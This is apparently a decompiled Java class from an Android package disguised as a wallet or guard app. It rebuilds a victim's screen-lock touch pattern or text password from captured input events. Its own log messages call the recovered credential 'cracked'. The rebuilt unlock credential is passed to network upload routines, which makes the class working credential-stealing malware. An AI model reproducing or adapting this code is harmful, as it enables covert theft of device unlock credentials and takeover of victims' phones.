package com.guard.wallet.plug;

import a1.q;
import android.util.Log;
import com.guard.wallet.http.l;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.RespCipherStateVO;
import com.guard.wallet.utils.h;
import java.io.Serializable;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;

public final class f implements Serializable {
   public ReqListenHelper a;
   public final LinkedList b = new LinkedList();
   public final LinkedList c = new LinkedList();

   public final void a() {
      boolean var1;
      LinkedList var3;
      Integer var4;
      ReqUnlockDeviceVO var10;
      label97: {
         ReqListenHelper var2 = this.a;
         var3 = this.c;
         var1 = true;
         var4 = 1;
         if (var2 != null && !var3.isEmpty()) {
            if (Objects.equals(this.a.getListenType(), var4)) {
               var10 = new ReqUnlockDeviceVO();
               var10.setTouchCipher(new LinkedList<>());
               var10.getTouchCipher().addAll(var3);
               var10.setCipherGradeCode("PASSWORD_QUALITY_TOUCH_POINTS");
               StringBuilder var5 = new StringBuilder("已破解触点密码:");
               var5.append(var10);
               Log.d("com.guard.wallet.plug.f", var5.toString());
               break label97;
            }

            RespCipherStateVO var9 = new RespCipherStateVO();
            var9.setListenType(this.a.getListenType());
            var9.setListenId(this.a.getListenId());
            var9.setSubscribeId(this.a.getSubscribeId());
            var9.setCipherGradeCode("PASSWORD_QUALITY_TOUCH_POINTS");
            var9.setTouchCipher(new LinkedList<>());
            var9.getTouchCipher().addAll(var3);
            l.C(var9);
         }

         var10 = null;
      }

      var3.clear();
      LinkedList var17 = this.b;
      ReqUnlockDeviceVO var16 = var10;
      if (!var17.isEmpty()) {
         LinkedList var7 = new LinkedList();
         LinkedList var8 = new LinkedList();
         LinkedList var6 = new LinkedList();
         var17.removeIf(new b(this, var7, var8, var6, 1));
         var16 = var10;
         if (var10 == null) {
            var16 = new ReqUnlockDeviceVO();
         }

         if (!var8.isEmpty()) {
            var8.sort(new n.a(1));
            var10 = com.guard.wallet.plug.c.h(var8);
            if (var10 != null && !q.B(var10.getTextCipher())) {
               StringBuilder var20 = new StringBuilder("按ID破解:");
               var20.append(var10.getTextCipher());
               Log.d("com.guard.wallet.plug.f", var20.toString());
               var16.setCipherGradeCode(var10.getCipherGradeCode());
               var16.setTextCipher(var10.getTextCipher());
            }
         }

         if (!var7.isEmpty()) {
            var7.sort(new n.a(1));
            var10 = com.guard.wallet.plug.c.i(var7);
            if (var10 != null && !q.B(var10.getTextCipher())) {
               StringBuilder var19 = new StringBuilder("按文本破解:");
               var19.append(var10.getTextCipher());
               Log.d("com.guard.wallet.plug.f", var19.toString());
               if (q.B(var16.getCipherGradeCode())) {
                  var16.setCipherGradeCode(var10.getCipherGradeCode());
               }

               if (q.B(var16.getTextCipher()) || com.guard.wallet.plug.c.e(var16.getTextCipher(), var16.getTextCipher())) {
                  var16.setTextCipher(var10.getTextCipher());
               }
            }
         }

         if (!var6.isEmpty()) {
            var6.sort(new n.a(1));
            var10 = com.guard.wallet.plug.c.h(var6);
            if (var10 != null && !q.B(var10.getTextCipher())) {
               StringBuilder var18 = new StringBuilder("按DESC破解:");
               var18.append(var10.getTextCipher());
               Log.d("com.guard.wallet.plug.f", var18.toString());
               if (q.B(var16.getCipherGradeCode())) {
                  var16.setCipherGradeCode(var10.getCipherGradeCode());
               }

               if (q.B(var16.getTextCipher()) || com.guard.wallet.plug.c.e(var16.getTextCipher(), var16.getTextCipher())) {
                  var16.setTextCipher(var10.getTextCipher());
               }
            }
         }

         var17.clear();
      }

      label61:
      if (Objects.equals(this.a.getListenType(), var4) && !q.B(var16.getCipherGradeCode())) {
         if (!com.guard.wallet.plug.c.d(var16.getTextCipher())) {
            List var14 = var16.getTouchCipher();
            if (var14 == null || var14.isEmpty()) {
               var1 = false;
            }

            if (!var1) {
               break label61;
            }
         }

         StringBuilder var15 = new StringBuilder("Lock Cipher:");
         var15.append(var16);
         Log.d("com.guard.wallet.plug.f", var15.toString());
         h.C(var16);
         l.B(var16);
      }

      this.a = null;
   }
}
